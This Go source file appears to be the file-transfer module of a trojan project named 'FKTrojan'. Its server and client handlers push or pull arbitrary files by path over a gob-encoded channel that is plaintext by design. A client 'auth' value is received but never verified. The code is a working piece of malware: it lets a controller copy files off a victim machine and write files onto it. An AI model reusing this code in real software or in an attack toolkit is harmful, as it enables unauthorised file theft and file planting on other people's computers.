package service_transfer

import (
	"FKTrojan/config"
	. "FKTrojan/dao"
	. "FKTrojan/flog"
	. "FKTrojan/stream_utils"
	"encoding/gob"
	"fmt"
	"io"
)

// 这里所有数据是明文
// 不用考虑解密问题
func ServerHandler(r io.Reader, w io.Writer) error {
	gobDecoder := gob.NewDecoder(r)
	gobEncoder := gob.NewEncoder(w)
	var auth Client
	err := gobDecoder.Decode(&auth)
	if err != nil {
		fmt.Printf("decoder error %v\n", err)
		return err
	}
	var cmd *Command = &Command{}

	err = gobDecoder.Decode(cmd)
	if err != nil {
		return err
	}
	useGzip := config.Conf.EnableCompressTransfer
	err = gobEncoder.Encode(useGzip)
	switch cmd.Code {
	case CMD_TRANS_S_TO_C:
		{
			serverPath, _, err := cmd.GetPath()
			if err != nil {
				return err
			}
			err = FileToStream(serverPath, w, useGzip)
			break
		}
	case CMD_TRANS_C_TO_S:
		{
			serverPath, _, err := cmd.GetPath()
			if err != nil {
				return err
			}
			err = StreamToFile(serverPath, r, useGzip)
			break
		}
	default:
		{
			err = fmt.Errorf("not a transfer cmd %v", cmd.String())
		}
	}
	if err != nil {
		return err
	}
	return nil
}

func ClientHandler(r io.Reader, w io.Writer, externalCmd *Command) error {
	gobDecoder := gob.NewDecoder(r)
	gobEncoder := gob.NewEncoder(w)
	auth := NewClient()
	err := gobEncoder.Encode(auth)
	if err != nil {
		return err
	}
	var cmd Command

	err = gobEncoder.Encode(externalCmd)
	if err != nil {
		return err
	}
	Flog.Printf("receive transfer cmd : %s\n", externalCmd.String())
	cmd = *externalCmd
	var useGzip bool
	err = gobDecoder.Decode(&useGzip)
	_, clientPath, err := cmd.GetPath()
	if err != nil {
		return err
	}
	switch cmd.Code {
	case CMD_TRANS_C_TO_S:
		{
			err = FileToStream(clientPath, w, useGzip)
			break
		}
	case CMD_TRANS_S_TO_C:
		{
			err = StreamToFile(clientPath, r, useGzip)
			break
		}
	default:
		{
			err = fmt.Errorf("not a transfer cmd %v", cmd.String())
		}
	}
	if err != nil {
		return err
	}

	return nil
}
